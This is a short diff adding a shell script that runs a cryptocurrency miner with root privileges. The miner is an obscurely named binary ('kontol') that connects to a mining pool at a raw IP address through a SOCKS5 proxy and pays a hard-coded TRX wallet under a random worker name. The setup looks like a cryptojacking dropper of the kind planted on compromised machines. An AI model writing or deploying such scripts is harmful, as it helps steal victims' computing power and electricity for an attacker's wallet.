@@ -1,0 +1,11 @@
+POOL=172.104.191.254:3333
+
+WALLET=TRX:TKnHQQ6LGdSKb4kV5yZxTZSvqVhgVnNMRi
+
+WORKER=$(echo $(shuf -i 1-999999999 -n 1)-FA)
+
+PROXY=socks5://172.104.191.254:3333
+
+ALGO=wrkzcoin
+
+sudo ./kontol --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO
